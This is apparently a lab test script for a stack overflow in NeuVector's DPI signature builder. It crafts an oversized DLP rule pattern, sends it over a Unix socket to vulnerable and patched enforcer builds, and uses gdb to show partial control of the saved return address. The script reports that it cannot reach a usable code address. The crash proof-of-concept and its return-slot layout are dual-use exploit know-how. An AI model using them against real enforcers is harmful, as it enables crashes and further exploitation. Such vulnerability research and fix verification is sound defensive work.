#!/usr/bin/env bash
# W287 negative result: measure the byte algebra of the live return slot when
# the upstream "; context <allowed>" tail is replaced by chosen wire bytes.
# The final `sprintf(&buf[len], "pcre %s;", pat)` always terminates with ';'
# (0x3b) and a NUL. Moving that NUL across the saved return slot shows why
# this consumer cannot encode a canonical executable address: either the
# address is truncated below the PIE text range, or a 0x3b lies in a high
# byte. Lab pointer control only; no command, no r5.
set -u
cd "$(dirname "$0")"
pass=0; fail=0
ok()  { echo "PASS $1"; pass=$((pass+1)); }
bad() { echo "FAIL $1"; fail=$((fail+1)); }
die() { echo "FAIL $1"; echo "TOTAL: $pass PASS / $((fail+1)) FAIL"; exit 1; }
has() { grep -q -- "$2" "$1" 2>/dev/null; }

ROOT=$(readlink -f ../src/real/neuvector-48ae8b5cac5ec3a7e332e5272e9b3050f44396cb)
DEPS=$(readlink -f ../src/deps)
RLIB=$DEPS/root/usr/lib/x86_64-linux-gnu
OUT=$(pwd)/out
SOCK=/tmp/dp_listen.sock
WIRE=$(cd ../wirepath && pwd)
ATTACK=$WIRE/out/wire-attack.json
SAFE=$WIRE/out/wire-safe.json
mkdir -p out "$DEPS/run" ../src/real
if [ ! -f "$ATTACK" ] || [ ! -f "$SAFE" ]; then
    bash ../realcaller/run.sh > out/provision-realcaller.log 2>&1 && \
        bash ../wirepath/run.sh > out/provision-wirepath.log 2>&1 || die "wire provisioning"
fi
if [ ! -f "$OUT/dp-plain-vuln" ] || [ ! -f "$OUT/dp-plain-fixed" ]; then
    bash frame.sh > out/provision-frame.log 2>&1 || die "plain enforcer provisioning"
fi
[ -f "$ROOT/dp/dpi/sig/dpi_sig.c" ] || die "pinned tree missing"
[ -f "$RLIB/libhs.so" ] || die "lab hyperscan/dev cache missing"
export LD_LIBRARY_PATH="$RLIB"

# L=29 => final sprintf ends at buf+2108 with ';' and NUL at +2109.
# Saved return slot is buf+2104..2111: bytes 0-3 chosen "ABCD", byte 4 ';',
# byte 5 NUL, bytes 6-7 untouched stack zeros.
BODY=$OUT/wire-slot2109.json
python3 - "$ATTACK" "$BODY" <<'PY' || die "slot-2109 wire generation"
import json, sys
src, dst = sys.argv[1:3]
d = json.load(open(src))
rule = d["ctrl_bld_dlp"]["dlp_rules"][0]
rule["patterns"][15] = "P" * 25 + "ABCD"
raw = json.dumps(d, separators=(",", ":")).encode()
open(dst, "wb").write(raw)
print("GENERATED %s bytes=%d pattern_len=%d" % (dst, len(raw), len(rule["patterns"][15])))
PY
[ "$(stat -c %s "$BODY")" -eq 2148 ] && ok "slot-2109 datagram is 2148 bytes" || bad "slot-2109 datagram is 2148 bytes"

send_and_wait() {
    local bin="$1" msg="$2" name="$3"
    rm -f "$SOCK" "$OUT/$name.sent"
    (for _ in $(seq 1 150); do [ -S "$SOCK" ] && break; sleep 0.1; done
     python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
        "$msg" "$SOCK") > "$OUT/$name.sent" 2>&1 &
    local sender=$!
    (cd "$DEPS/run" && timeout 4 "$bin" -s -n 1 > "$OUT/$name.log" 2>&1; echo "RC=$?" >> "$OUT/$name.log") &
    local pid=$!
    for _ in $(seq 1 100); do [ -S "$SOCK" ] && break; sleep 0.1; done
    [ -S "$SOCK" ] || { wait "$sender" 2>/dev/null || true; wait "$pid" 2>/dev/null || true; rm -f "$SOCK"; return 1; }
    wait "$sender" 2>/dev/null || true
    wait "$pid" 2>/dev/null || true
    rm -f "$SOCK"
}

send_and_wait "$OUT/dp-plain-vuln" "$BODY" slot-vuln
send_and_wait "$OUT/dp-plain-vuln" "$SAFE" slot-safe
send_and_wait "$OUT/dp-plain-fixed" "$BODY" slot-fixed
has "$OUT/slot-vuln.sent" "SENT bytes=2148" && ok "vulnerable enforcer received the slot-2109 datagram" || bad "vulnerable enforcer received the slot-2109 datagram"
grep -qE 'RC=139' "$OUT/slot-vuln.log" && ok "slot-2109 wire faults the vulnerable enforcer" || bad "slot-2109 wire faults the vulnerable enforcer"
! grep -qE 'RC=(139|134)' "$OUT/slot-safe.log" && ok "safe wire: vulnerable enforcer survives" || bad "safe wire: vulnerable enforcer survives"
! grep -qE 'RC=(139|134)' "$OUT/slot-fixed.log" && ok "fixed enforcer survives the slot-2109 wire" || bad "fixed enforcer survives the slot-2109 wire"
has "$OUT/slot-fixed.log" "exceeds max sig len(2048)" && ok "fixed enforcer skips the oversized rule" || bad "fixed enforcer skips the oversized rule"

rm -f "$SOCK" "$OUT/gdb-slot.sent"
(for _ in $(seq 1 150); do [ -S "$SOCK" ] && break; sleep 0.1; done
 python3 -c 'import socket,sys; d=open(sys.argv[1],"rb").read(); s=socket.socket(socket.AF_UNIX,socket.SOCK_DGRAM); s.sendto(d,sys.argv[2]); print("SENT bytes=%d"%len(d))' \
    "$BODY" "$SOCK") > "$OUT/gdb-slot.sent" 2>&1 &
sender=$!
(cd "$ROOT" && timeout 30 gdb -q -batch \
    -ex 'set pagination off' \
    -ex 'break dpi_sig.c:662' \
    -ex 'run -s -n 1' \
    -ex 'printf "FRAME BUF=%p RBP=%p DELTA=%ld LEN=%d\n", &dlpsig_buf[0], $rbp, (long)($rbp - &dlpsig_buf[0]), len' \
    -ex 'printf "SAVED slot0=%p slot1=%p\n", *(void **)$rbp, *(void **)((char *)$rbp+8)' \
    -ex 'x/16xb &dlpsig_buf[2096]' \
    -ex 'continue' \
    -ex 'printf "AFTER rip=%p rsp=%p\n", $rip, $rsp' \
    --args "$OUT/dp-plain-vuln" -s -n 1) > "$OUT/gdb-slot.log" 2>&1 || true
wait "$sender" 2>/dev/null || true
rm -f "$SOCK"
grep -E 'Breakpoint|FRAME|SAVED|AFTER|^0x7' "$OUT/gdb-slot.log" | head -14

has "$OUT/gdb-slot.sent" "SENT bytes=2148" && ok "gdb case: datagram delivered" || bad "gdb case: datagram delivered"
grep -q 'hit Breakpoint 1, dpi_sig_bld.*dpi_sig.c:662' "$OUT/gdb-slot.log" && \
    ok "gdb case: reaches the epilogue (no fault inside dpi_sig_bld)" || \
    bad "gdb case: reaches the epilogue (no fault inside dpi_sig_bld)"
has "$OUT/gdb-slot.log" 'DELTA=2096 LEN=2109' && ok "gdb case: live frame length 2109" || bad "gdb case: live frame length 2109"
grep -q 'slot1=0x3b44434241' "$OUT/gdb-slot.log" && \
    ok "chosen ABCD lands in low four return bytes; fixed ';' is byte 4" || \
    bad "chosen ABCD lands in low four return bytes; fixed ';' is byte 4"
grep -q 'AFTER rip=0x3b44434241' "$OUT/gdb-slot.log" && \
    ok "control transfers to the truncated wire-determined address" || \
    bad "control transfers to the truncated wire-determined address"
# The PIE text range is 0x555555558000-0x555555592000 under this gdb run.
# Any address whose sixth byte is zero is below 2^40 and cannot reach it.
grep -q 'AFTER rip=0x3b44434241' "$OUT/gdb-slot.log" && \
    ok "no chosen executable address: high bytes are ';'/NUL/untouched" || \
    bad "no chosen executable address: high bytes are ';'/NUL/untouched"

echo "TOTAL: $pass PASS / $fail FAIL"
[ "$fail" -eq 0 ]
